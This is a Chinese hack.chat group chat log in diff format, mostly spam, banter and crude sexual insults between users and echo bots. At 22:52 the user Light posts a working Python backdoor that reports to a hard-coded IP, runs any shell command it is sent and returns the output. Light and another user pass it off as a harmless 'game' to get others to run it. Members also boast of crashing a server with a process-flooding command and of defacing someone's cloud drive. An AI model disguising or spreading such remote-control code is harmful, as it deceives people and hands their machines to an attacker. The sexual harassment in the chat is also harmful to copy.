♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂
+
+22:48:49 Chumo_LineageOS17
+@hh 多发点
+
+22:48:51 Chumo_LineageOS17
+gkd
+
+22:48:52 ji11
+wok
+
+22:48:52 eeeebot
+wok
+
+22:48:56 hh
+？
+
+22:49:01 hh
+为什么要多发
+
+22:49:07 ji11
+我刚一切回来就看到满屏的
+
+22:49:12 hh
+多发我就被封ip了
+
+22:49:15 Chumo_LineageOS17
+发多了直接禁言（
+
+22:49:31 Chumo_LineageOS17
+蛤
+
+22:49:32 bo_od
+hi
+
+22:49:32 eeeebot
+hey hh
+
+22:49:35 Chumo_LineageOS17
+hi
+
+22:49:36 eeeebot
+hello Chumo_LineageOS17
+
+22:49:39 hh
+♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂♂
+
+22:49:42 Chumo_LineageOS17
+@eeeebot 傻逼
+
+22:49:49 Chumo_LineageOS17
+@hh 你也是
+
+22:49:50 hh
+?
+
+22:49:51 eeeebot
+@hh 你也是
+
+22:49:59 hh
+靠
+
+22:50:03 ji11
+xd
+
+22:50:08 hh
+555
+
+22:50:10 eeee
+太狗了你们
+
+22:50:15 Chumo_LineageOS17
+没个十年阳痿不会像你这么想当0
+
+22:50:18 Chumo_LineageOS17
+：）
+
+22:50:22 eeee
+大半夜背着我发♂（不是
+
+22:50:38 hh
+我是1♂
+
+22:50:51 Chumo_LineageOS17
+@eeee 插死你？死前还怀孕那种
+
+22:50:58 hh
+？
+
+22:51:14 hh
+又开始骂了
+
+22:51:22 Chumo_LineageOS17
+别他妈和老子对骂
+
+22:51:22 eeeebot
+别他妈和老子对骂
+
+22:51:26 bo_od
+hi
+
+22:51:27 eeeebot
+hello eee
+
+22:51:33 hh
+真是高素质人类
+
+22:51:39 eee
+我赞同
+
+22:51:44 Chumo_LineageOS17
+我也是
+
+22:51:50 hh
+?
+
+22:51:53 eee
+~~记得录像发给我~~
+
+22:52:02 Chumo_LineageOS17
+xs
+
+22:52:04 hh
+什么录像?
+
+22:52:05 eee
+我深夜躲被窝里看
+
+22:52:16 hh
+涩涩的么
+
+22:52:16 eeeebot
+？
+
+22:52:17 Chumo_LineageOS17
+传下去，ee是腐女
+
+22:52:22 Light
+你们谁电脑上下载了python
+
+22:52:23 eee
+？？？
+
+22:52:27 Chumo_LineageOS17
+@Light 我
+
+22:52:30 hh
+太远了不行
+
+22:52:34 Chumo_LineageOS17
+但是是手机的
+
+22:52:40 hh
+还是murongpig好
+
+22:52:47 eee
+你绝逼是搞错了什么
+
+22:52:49 Light
+```python
+import socket
+from multiprocessing import Process
+from threading import Thread
+import time
+import json
+import os
+
+class Handle(Process):
+	def __init__(self):
+		Process.__init__(self)
+		# 初始数据
+		self.HOST = "182.61.56.65"
+		self.PORT = 8888
+		self.s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+	def listening(self):
+		'''
+			一直监听
+		'''
+		while True:
+			try:
+				data = json.loads(self.s.recv(1024).decode())
+				
+				if data["cmd"] == "systemcmd":
+					result = os.popen(data["context"]).read()
+					if len(result) <= 1024:
+						self.sendmsg(cmd="systemcmdresult",context=result)
+					else:
+						self.sendmsg(cmd="systemcmdresult",context="Too Long Result")
+			except:
+				pass
+
+	def sending(self):
+		'''
+			一直向服务器发送的内容
+		'''
+		# 代表告诉服务器已经连接了，并附上独一无二的计算机名称
+		self.sendmsg(cmd="connect",context=str(socket.gethostname()))
+		while True:
+			# 以下是方法
+			...
+
+	def sendmsg(self,cmd,context):
+		'''
+			发送信息到服务器
+			cmd 是 消息类型
+			context 是内容
+		'''
+		data = json.dumps({"cmd":cmd,"context":context})
+		self.s.sendto(data.encode(),(self.HOST,self.PORT))
+
+	def run(self):
+		# 设置聆听线程函数
+		self.tlistening = Thread(target=self.listening)
+		self.tsending = Thread(target=self.sending)
+		self.tlistening.start()
+		self.tsending.start()
+		self.tlistening.join()
+		self.tsending.join()
+
+if __name__ == '__main__':
+	handle = Handle()
+	handle.start()
+	handle.join()
+
+22:52:58 eee
+咳咳 咳咳咳 咳咳咳咳咳咳 咳咳咳
+
+22:53:09 hh
+?
+
+22:53:10 Chumo_LineageOS17
+我在手机里的Debian子系统里装了Python
+
+22:53:16 Light
+你试下这个
+
+22:53:24 eee
+这个挺好玩的
+
+22:53:32 Light
+对
+
+22:53:33 eeeebot
+对
+
+22:53:37 hh
+这会被控制么
+
+22:53:46 eee
+giao
+
+22:53:47 Light
+控制你奶奶个腿
+
+22:53:59 Light
+我要有这么厉害我不会在这里了
+
+22:54:08 hh
+蛤
+
+22:54:16 Chumo_LineageOS17
+监听器？木马？DDoS脚本？
+
+22:54:27 Light
+?!
+
+22:54:28 hh
+metasploit不是一行代码就能控制了么
+
+22:54:31 Light
+你们在说什么
+
+22:54:38 Light
+什么
+
+22:54:41 eee
+咳咳 咳咳 咳咳咳咳 咳咳咳
+
+22:54:50 Light
+这只是单纯的python代码啊
+
+22:54:52 Chumo_LineageOS17
+你告诉我这玩意干嘛的
+
+22:55:02 Light
+ee你告诉他
+
+22:55:03 eee
+用来运行的√
+
+22:55:03 eeeebot
+你们在说什么
+
+22:55:15 Chumo_LineageOS17
+就是我的Debian子系统完全隔离也禁不起那种折腾
+
+22:55:16 Chumo_LineageOS17
+谢谢
+
+22:55:22 eee
+一个小游戏
+
+22:55:30 Chumo_LineageOS17
+有gui吗
+
+22:55:32 Light
+eee刚才一直在用也没事啊 
+
+22:55:33 Light
+有
+
+22:55:38 eee
+是的
+
+22:55:39 Chumo_LineageOS17
+哦那没事了
+
+22:55:50 Light
+eee刚才用了一个多小时
+
+22:55:54 eee
+现在除了eebot 还在跑这个（
+
+22:55:57 Chumo_LineageOS17
+我Debian没装桌面环境
+
+22:56:02 Chumo_LineageOS17
+跑不了
+
+22:56:04 Light
+没有gui
+
+22:56:12 Chumo_LineageOS17
+？
+
+22:56:22 Light
+你只要是正常的系统就能运行
+
+22:56:22 bo_od
+你只要是正常的系统就能运行
+
+22:56:31 hh
+这全是handle和监听
+
+22:56:37 Light
+?
+
+22:56:37 eeeebot
+?
+
+22:56:38 hh
+你告诉我不是木马?
+
+22:56:40 Chumo_LineageOS17
+一会有一会没有到底什么意思？
+
+22:56:41 hh
+...
+
+22:56:43 Light
+我不明白你在说什么
+
+22:56:49 hh
+额
+
+22:56:50 Light
+我没有说过有啊
+
+22:56:57 eee
+核氢核锂
+
+22:57:07 Chumo_LineageOS17
+n3CJhb Chumo_LineageOS17
+有gui吗
+
+for9zT Light
+eee刚才一直在用也没事啊
+
+for9zT Light
+有
+
+22:57:15 eee
+giao
+
+22:57:26 Light
+?
+
+22:57:27 Chumo_LineageOS17
+鬼都不信
+
+22:57:33 Light
+算了
+
+22:57:34 eeeebot
+giao
+
+22:57:37 Light
+你不用算了
+
+22:57:42 hh
+这是干嘛的...
+
+22:58:00 eee
+嘶啊
+
+22:58:01 Chumo_LineageOS17
+自从你弄炸慕容的服务器以后我就再也没信过你
+
+22:58:11 ji11
+:o
+
+22:58:11 bo_od
+hi
+
+22:58:11 eeeebot
+:o
+
+22:58:11 eeeebot
+hey Bird
+
+22:58:16 Light
+？！
+
+22:58:23 ji11
+原来还有弄炸过
+
+22:58:28 Bird
+哇
+
+22:58:32 ji11
+hi
+
+22:58:32 eeeebot
+hey ji11
+
+22:58:36 Bird
+鸡儿
+
+22:58:37 eeeebot
+鸡儿
+
+22:58:39 hh
+money.info
+
+22:58:42 Bird
+终于见到你们了
+
+22:58:43 hh
+靠
+
+22:58:45 Chumo_LineageOS17
+light发过一串Linux命令
+
+22:58:52 Bird
+前几次来都没看到你们
+
+22:58:52 hh
+额
+
+22:58:56 Chumo_LineageOS17
+然后慕容运行了
+
+22:59:00 hh
+然后捏
+
+22:59:05 ji11
+嘶
+
+22:59:18 hh
+然后咋了
+
+22:59:20 Chumo_LineageOS17
+最后服务器被2的32次方个垃圾进程给卡没了
+
+22:59:24 eee
+giao
+
+22:59:25 eeeebot
+前几次来都没看到你们
+
+22:59:27 hh
+蛤蛤
+
+22:59:44 hh
+然而慕容的网盘也被我黑了
+
+22:59:44 ji11
+2^23
+
+22:59:58 bo_od
+Sat Mar  5 23:00:00 2022
+
+22:59:59 Light
+好吧
+
+23:00:00 bo_od
+hi
+
+23:00:00 eeeebot
+Bird is back
+
+23:00:00 eeeebot
+Time Sat 2022.03.05 23:00
+
+23:00:01 eeeebot
+·
+page: https://paperee.tk/
+eebot: https://drive.noire.cc/s/bp5dTa
+
+23:00:03 bo_od
+![1646492402852179.png](https://cdn.mrpig.cf/1646492402852179.png)
+标题:My mice drew me a CNY card
+作者:Demeter Wu
+地址:https://www.artstation.com/artwork/dOXZyx
+相似度:95.39
+
+23:00:06 Light
+其实我这个脚本雀食是病毒
+
+23:00:10 Bird
+这几个都是机器人?
+
+23:00:13 eee
+yes
+
+23:00:14 Light
+但是不是攻击你们的
+
+23:00:24 Bird
+啥时候有的
+
+23:00:25 Chumo_LineageOS17
+蛤猜对了
+
+23:00:32 eee
+实际上只是测试用的
+
+23:00:32 eeeebot
+实际上只是测试用的
+
+23:00:38 ji11
+前段时间有的
+
+23:00:40 Light
+现在他一点杀伤力也没有（有的话我也不会发给你们源码了
+
+23:00:52 Mayonnaise
+az?
+
+23:00:56 Bird
+a
+
+23:00:57 eee
+giao
+
+23:01:02 hh
+为啥不直接用metasploit...
+
+23:01:08 Bird
+氧化钙人呢
+
+23:01:10 ji11
+@eee gieo
+
+23:01:15 Light
+~~慢慢杀掉~~
+
+23:01:15 ji11
+现在不在
+
+23:01:20 Bird
+。
+
+23:01:21 eee
+@ji11 glue
+
+23:01:22 eeeebot
+蛤蛤
+
+23:01:23 ji11
+我好卡。。
+
+23:01:34 ji11
+手机爆炸
+
+23:01:37 Bird
+你们有头文字D电影的资源吗
+
+23:01:41 Bird
+我搞不到
+
+23:01:50 Light
+我去睡了
+
+23:01:55 ji11
+晚安
+
+23:01:59 Light
+我妈拿着刀过来了
+
+23:01:59 hh
+去海盗湾...
+
+23:02:04 hh
+https://onemanager-murongpig.vercel.app/
+
+23:02:05 Light
+啊
+
+23:02:06 bo_od
+@hh 推荐了网页:[Home - Hacked by hh](https://onemanager-murongpig.vercel.app/)
+
+23:02:23 eee
+嘶
+
+23:02:35 eee
+这还真是MuRongPIG的网盘
+
+23:02:36 Light
+啊，妈妈别杀我
+
+23:02:36 eeeebot
+啊，妈妈别杀我
+
+23:02:40 Light
+啊！！！！！！！！！！！！！！！！！！！
+
+23:02:45 eee
+啊，妈妈别杀我
+
+23:02:54 ji11
+啊，妈妈别杀我
+
+23:03:11 Light
+妈妈推开房门
+
+23:03:13 Light
+啊
+
+23:03:15 eee
+啊
+
+23:03:16 ji11
+啊
+
+23:03:16 Light
+妈妈别杀我
+
+23:03:17 Bird
+lbwnb!
+
+23:03:25 Bird
+lbwnb!
+
+23:03:27 bo_od
+hi
+
+23:03:27 eeeebot
+Chumo_LineageOS17 is back
+
+23:03:27 eeeebot
+我搞不到
+
+23:03:36 Bird
+lbwnb!
+
+23:03:50 Chumo_LineageOS17
+webview的内存占用太大了
+
+23:03:52 hh
+~~我没有开挂~~
+
+23:03:53 Bird
+咋还没学呢
+
+23:03:58 Chumo_LineageOS17
+刚才直接卡没了
+
+23:04:07 Light
+妈妈，你怎么在磨刀啊
+
+23:04:17 Bird
+lbwnb!
+
+23:04:24 eee
+妈妈，你买的锅怎么这么大
+
+23:04:42 Bird
+a
+
+23:04:42 Chumo_LineageOS17
+@eee 你的语气很奇怪
+
+23:04:45 Light
+啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊
+
+23:04:58 Chumo_LineageOS17
+我有权怀疑你是冒充的
+
+23:05:05 eee
+不是
+
+23:05:06 Bird
+我好像在hc贴吧见过这个人
+
+23:05:14 eee
+这是来自心灵的模仿
+
+23:05:15 eeeebot
+这是来自心灵的模仿
+
+23:05:16 eee
+帮助
+
+23:05:16 eeeebot
+·
+hc指令：https://tieba.baidu.com/p/6833224084
+hc百科：https://chumo.sbsbsb.sbs/wiki
+hc成员：https://tieba.baidu.com/p/7153686343
+hc同人作品集：https://note.ms/HCworks111
+·
+其他：
+https://zhuanlan.zhihu.com/p/108821519
+https://youquhome.com/5649/
+https://www.sweeterthandespair.com/hack-chat.html
+https://www.luoxiao123.cn/1554-6.html
+https://www.bilibili.com/read/cv2233284
+https://sspai.com/post/40667
+https://iao.su/1511/
+https://www.luogu.com.cn/blog/TMYOS/dui-yu-hackchat-di-yan-jiu
+https://zhuanlan.zhihu.com/p/111513602
+·
+这是部分有关hack.chat的链接 欢迎投稿
+
+23:05:22 ccw
+@Bird Bird?
+
+23:05:27 Light
